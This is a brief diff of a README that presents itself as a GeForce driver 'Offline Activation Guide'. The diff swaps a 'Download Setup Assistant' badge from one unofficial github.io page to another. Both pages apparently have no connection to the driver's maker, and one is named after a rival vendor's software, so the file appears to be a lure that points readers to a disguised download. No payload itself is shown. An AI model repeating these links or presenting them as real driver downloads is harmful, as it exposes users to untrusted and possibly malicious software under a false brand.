@@ -1,6 +1,6 @@
-# GeForce Game Ready Driver — Offline Activation Guide
+# GeForce Game Ready Driver 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://amd-radeon-software-adrenalin.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/GeForceGame)
 
 ---
 
